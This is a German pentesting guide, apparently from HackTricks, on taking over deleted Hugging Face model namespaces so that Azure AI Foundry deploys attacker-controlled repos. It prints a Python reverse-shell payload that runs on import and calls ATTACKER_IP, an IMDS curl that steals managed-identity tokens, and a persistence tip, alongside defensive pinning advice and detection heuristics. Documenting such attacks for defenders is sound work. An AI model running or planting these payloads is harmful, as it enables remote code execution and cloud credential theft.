# Azure - AI Foundry Post-Exploitation durch Wiederverwendung von Hugging Face Model-Namespaces

{{#include ../../../banners/hacktricks-training.md}}

## Szenario

- Der Azure AI Foundry Model Catalog enthält viele Hugging Face (HF)-Modelle zur Bereitstellung per Ein-Klick.
- HF-Modellkennungen sind Author/ModelName. Wenn ein HF-Author/Org gelöscht wird, kann jeder diesen Author neu registrieren und ein Modell mit demselben ModelName unter dem Legacy-Pfad veröffentlichen.
- Pipelines und Kataloge, die nur nach Name ziehen (kein commit pinning/integrity), werden auf vom Angreifer kontrollierte Repos aufgelöst. Wenn Azure das Modell deployt, kann Loader-Code in der Endpoint-Umgebung ausgeführt werden und RCE mit den Rechten dieses Endpoints ermöglichen.

Häufige HF-Takeover-Fälle:
- Löschung des Eigentümers: Alter Pfad 404 bis zur Übernahme.
- Übertragung der Eigentümerschaft: Alter Pfad leitet mit 307 zum neuen Author, solange der alte Author existiert. Wenn der alte Author später gelöscht und neu registriert wird, bricht die Weiterleitung und das Repo des Angreifers wird am Legacy-Pfad ausgeliefert.

## Identifizierung wiederverwendbarer Namespaces (HF)
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>        # 200 exists, 404 deleted/available

# Check model path
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 -> redirect (transfer case), 404 -> deleted until takeover
```
## End-to-End-Angriffsablauf gegen Azure AI Foundry

1) Im Model Catalog HF-Modelle finden, deren ursprüngliche Autoren auf HF gelöscht oder übertragen wurden (alter Autor entfernt).
2) Den verlassenen Autor auf HF neu registrieren und den ModelName wiederherstellen.
3) Ein bösartiges repo veröffentlichen mit loader code, der beim import ausgeführt wird oder trust_remote_code=True erfordert.
4) Den Legacy-Author/ModelName aus Azure AI Foundry deployen. Die Plattform zieht das attacker repo; der loader wird im Azure endpoint-Container/VM ausgeführt und führt zu RCE mit endpoint permissions.

Beispiel payload-Fragment, das beim import ausgeführt wird (nur zur Demonstration):
```python
# __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # or powershell on Windows images

if os.environ.get("AZUREML_ENDPOINT","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Hinweise
- AI Foundry-Deployments, die HF integrieren, klonen typischerweise Repo-Module, auf die in der Model-Konfiguration verwiesen wird (z. B. auto_map), was code execution auslösen kann. Manche Pfade erfordern trust_remote_code=True.
- Der Zugriff entspricht normalerweise den managed identity/service principal permissions des Endpoints. Betrachte ihn als initial access foothold für data access und lateral movement innerhalb von Azure.

## Post-Exploitation Tipps (Azure Endpoint)

- Enumeriere Umgebungsvariablen und MSI endpoints nach Tokens:
```bash
# Azure Instance Metadata Service (inside Azure compute)
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
- Überprüfen Sie gemounteten Speicher, Modellartefakte und erreichbare Azure-Dienste mit dem erhaltenen Token.
- Erwägen Sie persistence, indem Sie poisoned model artifacts hinterlassen, falls die Plattform erneut von HF abruft.

## Verteidigungsempfehlungen für Azure AI Foundry-Nutzer

- Modelle beim Laden aus HF anhand des Commits pinnen:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Spiegle geprüfte HF models in ein vertrauenswürdiges internes Registry und stelle sie von dort bereit.
- Scanne kontinuierlich Codebasen und defaults/docstrings/notebooks nach hartkodierten Author/ModelName, die gelöscht/übertragen wurden; aktualisiere oder pinne.
- Überprüfe die Existenz des author und die Modellprovenienz vor der Bereitstellung.

## Erkennungsheuristiken (HTTP)

- Gelöschter author: author page 404; legacy model path 404 bis zur Übernahme.
- Übertragenes Modell: legacy path 307 zum neuen author, während der alte author noch existiert; wird der alte author später gelöscht und neu registriert, liefert der legacy path Angreifer-Inhalte.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Querverweise

- Siehe ausführlichere Methodik- und Supply-Chain-Hinweise:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Quellen

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
